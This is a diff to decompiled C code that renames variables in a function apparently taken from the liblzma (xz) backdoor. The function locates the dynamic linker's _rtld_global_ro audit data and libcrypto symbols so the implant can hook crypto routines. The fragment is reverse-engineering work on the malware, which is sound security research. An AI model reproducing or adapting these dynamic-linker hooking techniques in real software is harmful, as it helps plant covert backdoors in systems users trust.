@@ -23,8 +23,8 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   Elf64_Xword rtld_global_ro_size;
   dl_audit_symbind_alt_fn audit_symbind_alt;
   BOOL success;
-  Elf64_Sym *pEVar5;
-  char *str;
+  Elf64_Sym *rtld_global_ro_sym;
+  char *glro_lookup_string;
   Elf64_Sym *dsa_get0_pqg_symbol;
   u8 *string_ref;
   uchar *rtld_global_ro_ptr;
@@ -44,15 +44,15 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   zero_seed = 0;
   glro_naudit_string_id = 0;
   ldso_code_size = 0;
-  pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
-  if (pEVar5 != (Elf64_Sym *)0x0) {
+  rtld_global_ro_sym = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
+  if (rtld_global_ro_sym != (Elf64_Sym *)0x0) {
     glro_naudit_string_id = STR_GLRO_dl_naudit_naudit;
-    str = elf_find_string(dynamic_linker_elf,&glro_naudit_string_id,(void *)0x0);
-    if (str != (char *)0x0) {
+    glro_lookup_string = elf_find_string(dynamic_linker_elf,&glro_naudit_string_id,(void *)0x0);
+    if (glro_lookup_string != (char *)0x0) {
       dsa_get0_pqg_symbol = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
       string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&ldso_code_size);
       if ((string_ref != (u8 *)0x0) &&
-         (string_ref = find_string_reference(string_ref,string_ref + ldso_code_size,str), string_ref != (u8 *)0x0)) {
+         (string_ref = find_string_reference(string_ref,string_ref + ldso_code_size,glro_lookup_string), string_ref != (u8 *)0x0)) {
         if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
           dsa_get0_pqg_value = dsa_get0_pqg_symbol->st_value;
           libcrypto_ehdr = libcrypto_elf->elfbase;
@@ -64,8 +64,8 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
           *(undefined4 *)&dasm_cursor->instruction = 0;
           dasm_cursor = (dasm_ctx_t *)((long)dasm_cursor + (ulong)zero_seed * -8 + 4);
         }
-        rtld_global_ro_ptr = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
-        rtld_global_ro_size = pEVar5->st_size;
+        rtld_global_ro_ptr = dynamic_linker_elf->elfbase->e_ident + rtld_global_ro_sym->st_value;
+        rtld_global_ro_size = rtld_global_ro_sym->st_size;
         allocator = get_lzma_allocator();
         allocator->opaque = libcrypto_elf;
         evp_md_ctx_free_fn = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,allocator);
